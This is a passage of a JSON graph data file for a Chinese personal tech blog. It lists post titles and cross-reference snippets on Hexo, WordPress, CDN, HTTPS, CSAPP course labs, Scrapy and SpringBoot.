加速域名配置","types":["博客相关"],"size":6.8,"strokeWidth":2,"begin":1690133231},{"id":"648224007","label":"博客网站网页变灰的操作方法","types":["博客相关"],"size":2,"strokeWidth":2,"begin":1648302294},{"id":"1309833614","label":"又是被 Edge 气拥的一天天","types":["undefined","有感而发"],"size":3.2,"strokeWidth":2,"begin":1692888183},{"id":"1982369523","label":"双链渲染测试","types":["工具箱","核心协同"],"size":9.2,"strokeWidth":2,"begin":1685628367},{"id":"2065118013","label":"国内访问 Hexo 优化加速（CDN链接替换）","types":["博客相关","Hexo"],"size":8,"strokeWidth":2,"begin":1682674458},{"id":"1218172081","label":"图像采集头顶到顶部距离不通过？就用 Windows 自带的画图解决","types":["undefined"],"size":2,"strokeWidth":2,"begin":1698388401},{"id":"930915372","label":"在 ECS 中搭建 WordPress","types":["博客相关","WordPress"],"size":3.2,"strokeWidth":2,"begin":1647844786},{"id":"1308325830","label":"在你的 Hexo 博客上加入进度条","types":["博客相关","Hexo"],"size":3.2,"strokeWidth":2,"begin":1682683382},{"id":"1735498523","label":"好像我应该也是个生活区博主","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1697799174},{"id":"3709373237","label":"定制自己的 Waline 评论系统","types":["博客相关","Hexo"],"size":6.8,"strokeWidth":2,"begin":1682669712},{"id":"1355609062","label":"家里蹲的二十四节气","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1598088810},{"id":"1464127505","label":"对电脑端微信小程序抓包","types":["工具箱","核心协同"],"size":3.2,"strokeWidth":2,"begin":1713365679},{"id":"2958737902","label":"将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）","types":["工具箱","核心协同"],"size":5.6,"strokeWidth":2,"begin":1682871318},{"id":"3332201227","label":"巢湖日落","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1704120298},{"id":"2346883624","label":"成为一名个人博客网站站长","types":["undefined","社会生活"],"size":9.2,"strokeWidth":2,"begin":1647844786},{"id":"3607632637","label":"我上钩了——一次被钓鱼邮件受骗经历","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1695358470},{"id":"238315581","label":"旧页面-WordPress 站点隐私政策","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1646926720},{"id":"3096264560","label":"旧页面-关于我","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1646926720},{"id":"3538365946","label":"旧页面-友链","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1647591216},{"id":"3771188998","label":"旧页面-赞赏＆贡献","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1648300105},{"id":"3437638411","label":"本地文件夹的多端同步","types":["工具箱","核心协同"],"size":3.2,"strokeWidth":2,"begin":1699074318},{"id":"4272386753","label":"本地部署 PlantUML","types":["工具箱","核心协同"],"size":3.2,"strokeWidth":2,"begin":1694329993},{"id":"2737438580","label":"极简图书管理系统，快速上手Flask-Vue前后端开发","types":["undefined"],"size":2,"strokeWidth":2,"begin":1683188954},{"id":"85495977","label":"构建 Obsidian 的 Hexo 写作工作流","types":["工具箱","核心协同"],"size":10.4,"strokeWidth":2,"begin":1685629327},{"id":"346425435","label":"校园网有线网连接相关问题","types":["undefined"],"size":2,"strokeWidth":2,"begin":1681742881},{"id":"1637153567","label":"穷游长沙","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1707664007},{"id":"746142122","label":"第一次写 Hexo 插件","types":["undefined","有感而发"],"size":10.4,"strokeWidth":2,"begin":1714321643},{"id":"3395837292","label":"第一次开发 npm 插件","types":["undefined","有感而发"],"size":4.4,"strokeWidth":2,"begin":1697799107},{"id":"4028728107","label":"绿萝养殖日记","types":["undefined","有感而发"],"size":2,"strokeWidth":2,"begin":1652371200},{"id":"127992739","label":"自定义文章内外链接样式的另一种方法（使用 markdown-it 插件）","types":["博客相关","Hexo"],"size":3.2,"strokeWidth":2,"begin":1693068318},{"id":"1215492985","label":"装点你的 Butterfly 博客","types":["博客相关","Hexo"],"size":11.6,"strokeWidth":2,"begin":1685696100},{"id":"4084230277","label":"解决 Bing 搜索页自动返回顶部的问题","types":["undefined"],"size":3.2,"strokeWidth":2,"begin":1681635812},{"id":"2466246546","label":"解决 WordPress「在裁剪您的图像时发生了错误」的问题","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1647522249},{"id":"2009578670","label":"计算汉明重量的两个技巧性算法","types":["数学与算法"],"size":2,"strokeWidth":2,"begin":1720263189},{"id":"233589647","label":"设备管理器网卡属性没有电源管理选项卡的解决方法","types":["undefined"],"size":2,"strokeWidth":2,"begin":1656643697},{"id":"713171771","label":"误操作 WordPress 站点地址的解决方案","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1647592582},{"id":"3260727180","label":"软件测试工具Junit、Hamcrest、Eclemma的安装","types":["工具箱","undefined"],"size":2,"strokeWidth":2,"begin":1647262825},{"id":"3567162190","label":"那一年的暑假剪影","types":["undefined","有感而发"],"size":4.4,"strokeWidth":2,"begin":1659801600},{"id":"181570378","label":"部署 Hexo 个人博客框架到服务器","types":["博客相关","Hexo"],"size":4.4,"strokeWidth":2,"begin":1681380600},{"id":"1129186507","label":"阿里云ECS主机可ping通但拒绝连接的解决办法","types":["undefined"],"size":2,"strokeWidth":2,"begin":1694315628},{"id":"636905579","label":"页面展示用户 IP 地址及地理位置信息","types":["undefined"],"size":2,"strokeWidth":2,"begin":1694247209},{"id":"2226004458","label":"魔改脚本实现知网导出 Bibtex 参考格式","types":["工具箱"],"size":2,"strokeWidth":2,"begin":1683794241}],"links":[{"id":0,"context":["[[1433349372|【麒麟实训】撷英分享]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1973703782","target":"1433349372","report":[]},{"id":1,"context":["上面是配置文件关键内容写法，端口号什么的自行补充。上面的配置可以使用 certbot 工具启用 HTTPS。详看：[[1867823418|Linux 服务器 HTTPS 的配置]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1032806896","target":"1867823418","report":[]},{"id":2,"context":["[[4139834099|Butterfly 侧边栏实现 Obsidian 关系图谱]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"90746120","target":"4139834099","report":[]},{"id":3,"context":["实现无缝侧边栏参考我这篇教程：[[90746120|Butterfly 不改动主题源码实现自定义侧边栏]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"4139834099","target":"90746120","report":[]},{"id":4,"context":["- 使用钩子在 Hexo 部署前检查 Obsidian 是否启动：[[3569112562|Hexo 博客适配 Obsidian 新语法]]\n- Hexo 发布后自动刷新 CDN：[[2958737902|将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"4139834099","target":"2958737902","report":[]},{"id":5,"context":["- 使用钩子在 Hexo 部署前检查 Obsidian 是否启动：[[3569112562|Hexo 博客适配 Obsidian 新语法]]\n- Hexo 发布后自动刷新 CDN：[[2958737902|将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"4139834099","target":"3569112562","report":[]},{"id":6,"context":["关于夜间模式的问题详见：[[4033695206|Butterfly 夜间模式变换顶部网站图标]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"152796589","target":"4033695206","report":[]},{"id":7,"context":["> [!notice] CSAPP LAB 实验\n>\n> - CSAPP LAB-1 位操作（本文）\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3315008132","target":"165066519","report":[]},{"id":8,"context":["> [!notice] CSAPP LAB 实验\n>\n> - CSAPP LAB-1 位操作（本文）\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3315008132","target":"1051831239","report":[]},{"id":9,"context":["> [!notice] CSAPP LAB 实验\n>\n> - CSAPP LAB-1 位操作（本文）\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3315008132","target":"1735947091","report":[]},{"id":10,"context":["> [!notice] CSAPP LAB 实验\n>\n> - CSAPP LAB-1 位操作（本文）\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3315008132","target":"3522416439","report":[]},{"id":11,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - CSAPP LAB-2 二进制炸弹实验（本文）\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3522416439","target":"165066519","report":[]},{"id":12,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - CSAPP LAB-2 二进制炸弹实验（本文）\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3522416439","target":"1051831239","report":[]},{"id":13,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - CSAPP LAB-2 二进制炸弹实验（本文）\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3522416439","target":"1735947091","report":[]},{"id":14,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - CSAPP LAB-2 二进制炸弹实验（本文）\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3522416439","target":"3315008132","report":[]},{"id":15,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - CSAPP LAB-3 缓冲区溢出炸弹（本文）\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1735947091","target":"165066519","report":[]},{"id":16,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - CSAPP LAB-3 缓冲区溢出炸弹（本文）\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1735947091","target":"1051831239","report":[]},{"id":17,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - CSAPP LAB-3 缓冲区溢出炸弹（本文）\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1735947091","target":"3315008132","report":[]},{"id":18,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - CSAPP LAB-3 缓冲区溢出炸弹（本文）\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]","GDB 的使用详见：[[3522416439|CSAPP LAB-2 二进制炸弹实验]]。这里新学一个命令：`examine` 查看内存地址中的值（简写为 `x`）。`x` 命令的语法如下所示："],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1735947091","target":"3522416439","report":[]},{"id":19,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - CSAPP LAB-4 代码优化（本文）\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"165066519","target":"1051831239","report":[]},{"id":20,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - CSAPP LAB-4 代码优化（本文）\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"165066519","target":"1735947091","report":[]},{"id":21,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - CSAPP LAB-4 代码优化（本文）\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"165066519","target":"3315008132","report":[]},{"id":22,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - CSAPP LAB-4 代码优化（本文）\n> - [[1051831239|CSAPP LAB-5 手写动态存储分配器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"165066519","target":"3522416439","report":[]},{"id":23,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - CSAPP LAB-5 手写动态存储分配器（本文）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1051831239","target":"165066519","report":[]},{"id":24,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - CSAPP LAB-5 手写动态存储分配器（本文）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1051831239","target":"1735947091","report":[]},{"id":25,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - CSAPP LAB-5 手写动态存储分配器（本文）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1051831239","target":"3315008132","report":[]},{"id":26,"context":["> [!notice] CSAPP LAB 实验\n>\n> - [[3315008132|CSAPP LAB-1 位操作]]\n> - [[3522416439|CSAPP LAB-2 二进制炸弹实验]]\n> - [[1735947091|CSAPP LAB-3 缓冲区溢出炸弹]]\n> - [[165066519|CSAPP LAB-4 代码优化]]\n> - CSAPP LAB-5 手写动态存储分配器（本文）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1051831239","target":"3522416439","report":[]},{"id":27,"context":["DHT11 对时序要求严格，需要微妙级延时，我们常用的 HAL_Delay 是毫秒级时延。由于 FreeRTOS 是不支持微秒级延时的，需要自己定义微秒级别的延时函数（详见：[[3318795350|STM32 延时函数（FreeRTOS）]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3298282303","target":"3318795350","report":[]},{"id":28,"context":["在 [[1464127505|之前的文章]] 中提到，我需要每天查询宿舍水电费余额。抓到小程序查余额的接口后，我打算把消息通知到宿舍 QQ 群中（微信群机器人操作太麻烦，或者说只有企业群才有机器人）。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"888931094","target":"1464127505","report":[]},{"id":29,"context":["然后将运行 python 脚本的任务添加到 crontab 中实现定时启动（参考：[[2287168649|Linux 使用 Cron 创建定时任务]]）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"888931094","target":"2287168649","report":[]},{"id":30,"context":["后台运行 go-cqhttp（参考 [[2445395019|Linux 使用 nohup 后台运行程序]]）："],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"888931094","target":"2445395019","report":[]},{"id":31,"context":["我的工作流：[[2958737902|将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）]]、[[85495977|构建 Obsidian 的 Hexo 写作工作流]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"85495977","report":[]},{"id":32,"context":["漂浮物的显示：[[681885666|Hexo 博客添加漂浮物效果（可定制显示页面）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"681885666","report":[]},{"id":33,"context":["详见文章：[[1215492985|装点你的 Butterfly 博客]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"1215492985","report":[]},{"id":34,"context":["加入进度条：[[1308325830|在你的 Hexo 博客上加入进度条]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"1308325830","report":[]},{"id":35,"context":["我的工作流：[[2958737902|将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）]]、[[85495977|构建 Obsidian 的 Hexo 写作工作流]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"2958737902","report":[]},{"id":36,"context":["部署友链朋友圈：[[2966071784|server、sqlite 朋友圈部署方案]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"414962704","target":"2966071784","report":[]},{"id":37,"context":["关于双链渲染，心路历程详见：[[746142122|第一次写 Hexo 插件]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3569112562","target":"746142122","report":[]},{"id":38,"context":["[^gfm]: Markdown 相关语法规范详见 [[1011516134|Markdown 渲染测试]]","更多渲染情况详见本站渲染调试页：[[1011516134|Markdown 渲染测试]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3569112562","target":"1011516134","report":[]},{"id":39,"context":["渲染效果详见本站的测试页：[[1982369523|双链渲染测试]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3569112562","target":"1982369523","report":[]},{"id":40,"context":["旧方案仍然可以工作，不过操作繁琐。详见：[[2136059777|Obsidian Internal links 双向链接渲染解决方案]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3569112562","target":"2136059777","report":[]},{"id":41,"context":["解决 Callouts 问题的过程中，搜到 [widcardw](https://widcard.win/) 的博客并产生启发，于是我的第一款 NPM 插件 markdown-it-obsidian-imgsize 诞生了。开发杂记详见：[[3395837292|第一次开发 npm 插件]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3569112562","target":"3395837292","report":[]},{"id":42,"context":["- [[3709373237|定制自己的 Waline 评论系统]]\n- [[3015602463|为评论系统增加输入提醒【Waline】]]\n- [[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1495212389","target":"3015602463","report":[]},{"id":43,"context":["- [[3709373237|定制自己的 Waline 评论系统]]\n- [[3015602463|为评论系统增加输入提醒【Waline】]]\n- [[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1495212389","target":"3709373237","report":[]},{"id":44,"context":["- [[3709373237|定制自己的 Waline 评论系统]]\n- [[3015602463|为评论系统增加输入提醒【Waline】]]\n- [[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1495212389","target":"3790495434","report":[]},{"id":45,"context":["WordPress 博客网站使用 HTTPS：[[2062987538|WordPress 使用 HTTPS]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1867823418","target":"2062987538","report":[]},{"id":46,"context":["301 重定向以及 HSTS 等进阶配置：[[2201181434|博客域名解析管理与网站 CDN 加速域名配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1867823418","target":"2201181434","report":[]},{"id":47,"context":["certbot 部署的证书有效期为 3 个月，在过期前 1 个月会收到提示。我们可以重新运行 `certbot --nginx` 对相应的证书进行更新。或者结合 cron 定时任务完成自动更新。cron 用法详见：[[2287168649|Linux 使用 Cron 创建定时任务]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1867823418","target":"2287168649","report":[]},{"id":48,"context":["> [!warning] 这是一篇过期文章 [2024.04.12]\n> 本篇文章已过期。\n>\n> - 本文为文章 [[3569112562|Hexo 博客适配 Obsidian 新语法]] 中双链语法部分的分离，强烈建议使用新方法适配双向链接。\n> - 在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 [[746142122|第一次写 Hexo 插件]]\n> - 这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2136059777","target":"746142122","report":[]},{"id":49,"context":["> [!warning] 这是一篇过期文章 [2024.04.12]\n> 本篇文章已过期。\n>\n> - 本文为文章 [[3569112562|Hexo 博客适配 Obsidian 新语法]] 中双链语法部分的分离，强烈建议使用新方法适配双向链接。\n> - 在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 [[746142122|第一次写 Hexo 插件]]\n> - 这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2136059777","target":"3569112562","report":[]},{"id":50,"context":["[^osd]: [[85495977|构建 Obsidian 的 Hexo 写作工作流]]\n# 安装 PicGo（App）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3992879191","target":"85495977","report":[]},{"id":51,"context":["详看：[[1151366136|使用对象存储产品]]（腾讯云 COS）"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3992879191","target":"1151366136","report":[]},{"id":52,"context":["> 如果你对 Scrapy 还不熟悉，可以先看这一篇文章：[[3476966011|Scrapy-入门篇]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3753778605","target":"3476966011","report":[]},{"id":53,"context":["> 如果你掌握浏览器开发者工具的使用，我们可以很轻松的完成这件事情（详看 [[3753778605|Scrapy-充分利用浏览器中的开发者工具]]）。","> 有一些网站不存在翻页，而是采用无限滚动的方法实现更多内容的浏览（比如这个网站：[Quotes to Scrape](https://quotes.toscrape.com/scroll)）。在部分简单的情况下，爬取方法可以参考 [[3753778605|Scrapy-充分利用浏览器中的开发者工具]] 这篇文章。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3476966011","target":"3753778605","report":[]},{"id":54,"context":["[^jsd]: 参考 [[2065118013|国内访问 Hexo 优化加速（CDN链接替换）]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2966071784","target":"2065118013","report":[]},{"id":55,"context":["[^cdn]: 参见我的折腾过程：[[2201181434|博客域名解析管理与网站 CDN 加速域名配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2966071784","target":"2201181434","report":[]},{"id":56,"context":["更多参考详见本站文章：[[565697069|SpringBoot 的原理以及写一个自定义 Starter]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2896927132","target":"565697069","report":[]},{"id":57,"context":["更定制化的 ServiceLoader 实现以及相关应用场景详见这篇文章：[[3886683086|SPI 概念及案例实践（下）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2896927132","target":"3886683086","report":[]},{"id":58,"context":["> [!hint] 阅读前提示\n> 为了更好地理解文章，建议先阅读 [[2896927132|SPI 概念及案例实践（上）]]。","在 [[2896927132|这篇文章]] 中我们学习并实践了 Java 原生的 SPI 机制。但我们还想更便捷的使用 SPI。设想这样一个场景：当公司 A 使用互联网连接服务时，我们直接这样调用服务："],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3886683086","target":"2896927132","report":[]},{"id":59,"context":["下面你可以立即移步这篇文章加深上面所学知识的印象：[[565697069|SpringBoot 的原理以及写一个自定义 Starter]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1713466548","target":"565697069","report":[]},{"id":60,"context":["关于 SpringBoot 项目的部署方式详见本站文章：[[2985240736|SpringBoot 项目的上线方式]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2487324783","target":"2985240736","report":[]},{"id":61,"context":["> [!hint] 